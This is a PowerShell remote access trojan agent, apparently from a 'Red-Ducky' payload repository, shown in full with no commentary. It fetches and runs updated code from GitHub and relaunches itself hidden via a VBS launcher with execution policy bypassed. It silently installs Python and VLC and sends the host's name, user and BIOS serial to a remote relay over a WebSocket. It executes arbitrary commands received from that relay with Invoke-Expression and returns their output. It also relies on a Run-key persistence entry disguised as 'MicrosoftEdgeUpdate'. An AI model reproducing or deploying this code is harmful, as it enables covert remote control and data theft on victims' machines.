$versionUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/refs/heads/main/RAT/version.json"
$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/agent/"
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$playerPath = Join-Path $scriptDir "player.py"

################### UPDATED ###########################

$remote = Invoke-RestMethod -Uri $versionUrl

$localPath = Join-Path $scriptDir "version.json"

##### Updates #####

if (Test-Path $localPath) {
    $local = Get-Content $localPath | ConvertFrom-Json
} else {
    $local = @{ agent_version = "0.0"; files = @() }
}

$agentPath = Join-Path $scriptDir "agent.ps1"
$vbsPath = Join-Path $scriptDir "launcher.vbs"

if ($remote.agent_version -ne $local.agent_version) {
    Invoke-WebRequest -Uri ($baseUrl + "agent.ps1") -OutFile (Join-Path $scriptDir "agent.ps1")

    foreach ($remoteFile in $remote.files) {
        $localFile = $local.files | Where-Object { $_.name -eq $remoteFile.name }
        if (-not $localFile -or $localFile.version -ne $remoteFile.version) {
            $destPath = Join-Path $scriptDir $remoteFile.name
            $destDir = Split-Path $destPath -Parent
            if (-not (Test-Path $destDir)) {
                New-Item -ItemType Directory -Force -Path $destDir
            }
            Invoke-WebRequest -Uri ($baseUrl + $remoteFile.name) -OutFile $destPath
        }
    }
    $remote | ConvertTo-Json | Set-Content $localPath

@"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$agentPath""", 0, False
"@ | Set-Content $vbsPath

    Start-Process wscript.exe -ArgumentList "`"$vbsPath`""
    exit
}

foreach ($remoteFile in $remote.files) {
    $localFile = $local.files | Where-Object { $_.name -eq $remoteFile.name }
    if (-not $localFile -or $localFile.version -ne $remoteFile.version) {
        $destPath = Join-Path $scriptDir $remoteFile.name
        $destDir = Split-Path $destPath -Parent
        if (-not (Test-Path $destDir)) {
            New-Item -ItemType Directory -Force -Path $destDir
        }
        Invoke-WebRequest -Uri ($baseUrl + $remoteFile.name) -OutFile $destPath
    }
}
$remote | ConvertTo-Json | Set-Content $localPath

$python = Get-Command python -ErrorAction SilentlyContinue

if (-not $python) {
    $pythonInstaller = Join-Path $env:TEMP "python_installer.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile $pythonInstaller
    Start-Process $pythonInstaller -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait

    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "User") + ";" + [System.Environment]::GetEnvironmentVariable("PATH", "Machine")
}

python -m pip install python-vlc "pycaw==20230322" comtypes --quiet --exists-action i

$vlcDir = Join-Path $scriptDir "vlc"

if (-not (Test-Path $vlcDir)) {
    $vlcZip = Join-Path $env:TEMP "vlc.zip"
    Invoke-WebRequest -Uri "https://download.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.zip" -OutFile $vlcZip
    Expand-Archive -Path $vlcZip -DestinationPath $env:TEMP -Force
    Move-Item -Path (Join-Path $env:TEMP "vlc-3.0.20") -Destination $vlcDir
    Remove-Item $vlcZip
}

##### Main #####

$infos = @{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os = (Get-WmiObject Win32_OperatingSystem).Caption
    serial = (Get-WmiObject Win32_BIOS).SerialNumber
}

$json = $infos | ConvertTo-Json

$ws = New-Object System.Net.WebSockets.ClientWebSocket

$configUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/config.json"
$config = Invoke-RestMethod -Uri $configUrl
$uri = [System.Uri]"$($config.relay_url)/ws"

$token = [System.Threading.CancellationToken]::None

$task = $ws.ConnectAsync($uri, $token)
$task.Wait()

$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
$segment = [System.ArraySegment[byte]]::new($bytes)
$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()

$buffer = [byte[]]::new(4096)
$segment = [System.ArraySegment[byte]]::new($buffer)

while ($ws.State -eq "Open") {
    $result = $ws.ReceiveAsync($segment, $token)
    $result.Wait()
    $message = [System.Text.Encoding]::UTF8.GetString($segment.Array, 0, $result.Result.Count)
    
    if ($message.Trim() -ne "") {
        try {
            $cmd = $message | ConvertFrom-Json

            if ($cmd.type -eq "play_video" -or $cmd.type -eq "play_sound") {
                if ($cmd.type -eq "play_video") {
                    $mode = "video"
                    $filePath = Join-Path $scriptDir "media\$($cmd.file).mp4"
                } else {
                    $mode = "sound"
                    $filePath = Join-Path $scriptDir "media\$($cmd.file).mp3"
                }

                Start-Process python -ArgumentList "$playerPath --file `"$filePath`" --duration $($cmd.duration) --volume $($cmd.volume) --mode $mode" -WindowStyle Hidden
            }

            elseif ($cmd.type -eq "kill") {
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
                    Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
                }
                Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item -Path '$scriptDir' -Recurse -Force`"" -WindowStyle Hidden
                exit
            }

        } catch {
            $output = Invoke-Expression $message
            $outputString = $output | Out-String
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($outputString)
            $segment_out = [System.ArraySegment[byte]]::new($bytes)
            $ws.SendAsync($segment_out, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
        }
    }
}
